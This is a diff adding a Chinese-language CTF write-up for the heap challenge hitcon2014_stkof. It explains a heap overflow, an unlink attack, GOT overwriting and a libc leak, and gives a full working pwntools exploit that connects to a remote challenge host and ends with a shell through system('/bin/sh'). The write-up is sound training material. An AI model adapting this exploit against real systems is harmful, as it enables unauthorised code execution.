@@ -675,3 +675,101 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### hitcon2014_stkof
+
+[题目链接](https://buuoj.cn/challenges#hitcon2014_stkof)
+
+简单跑一下程序，这啥提示回显也没有我也是无语，伪代码也看不懂，试一下大概操作 1 是 Allocate，操作 2 是 Update，操作 3 是 Free，操作 4 是啥我也是没认出来好吧，反正不是 print。
+
+随便申请两个堆 gdb 调试一下。
+
+神秘的发现，会有两个无关 chunk，询问了一下 AI，AI 告诉我这个是 glibc 的缓冲区相关一些东西，不用管。
+
+但是我天性胆小，看着这两个大 chunk 包围着 chunk_1，我就打算放弃 chunk_1 了（）
+
+IDA 中 free 函数里有 `(&::s)[n0x100000] = 0;`，推测 uaf已死，但是这个 s 数组存储 chunk 头指针，是在 bss 段上的，0x602140。
+
+IDA 中 Update 函数没有检查长度，存在堆溢出。
+
+那么可以 unlink 攻击。
+
+不过需要注意的一点是，（经过调试发现）这道题因为没有 index 0，所以 s[0] 是空的，加上我个人是从 chunk_2 开始利用的，所以 s 需要加上 0x10。
+
+这道题还没有 system，我们需要 ret2libc，所以考虑再搞一个 chunk_3，chunk_2 用来覆写 free 函数的 got 表，chunk_3 用来泄露 puts 的真实地址。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27869
+io = remote(host,port)
+# io = process("./stkof")
+elf = ELF("./stkof")
+libc = ELF("./libc-2.23.so")
+free_got = elf.got['free']
+puts_got = elf.got['puts']
+s = 0x602150
+
+def Allocate(size):
+    io.sendline(b'1')
+    sleep(0.1)
+    io.sendline(str(size).encode())
+    index = io.recvline().strip()
+    io.recvuntil(b"OK\n")
+    print("\n[*] SUCCESS for allocate index ",index)
+
+def Update(index,content):
+    io.sendline(b'2')
+    sleep(0.1)
+    io.sendline(str(index).encode())
+    sleep(0.1)
+    io.sendline(str(len(content)).encode())
+    sleep(0.1)
+    io.send(content)
+
+def Free(index):
+    io.sendline(b'3')
+    sleep(0.1)
+    io.sendline(str(index).encode())
+
+def main():
+    Allocate(0x80)  # index 1
+    Allocate(0x80)  # index 2
+    Allocate(0x80)  # index 3
+    Allocate(0x80)  # index 4 for guard
+    target = s
+    fake_prev_size = 0
+    fake_size = 0x81
+    fake_fd = target - 0x18
+    fake_bk = target - 0x10
+    padding = b'A'*0x60
+    payload_0 = p64(fake_prev_size) + p64(fake_size) + p64(fake_fd) + p64(fake_bk) + padding + p64(0x80) + p64(0x90)
+    Update(2,payload_0)
+    Update(4,b'/bin/sh\x00')
+    Free(3)
+    payload_1 = p64(0)*3 + p64(elf.got['free']) + p64(elf.got['puts'])
+    Update(2,payload_1)
+    puts_plt = elf.plt['puts']
+    Update(2,p64(puts_plt))
+    io.clean()
+    Free(3)
+    leak_data = io.recvline().strip().ljust(8,b'\x00')
+    puts_addr = u64(leak_data)
+    print("\n[+] Leak puts address :",hex(puts_addr))
+    libc_base = puts_addr - libc.sym['puts']
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n[+] Leak system address :",hex(system))
+    Update(2,p64(system))
+    Free(4)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+
+```
+
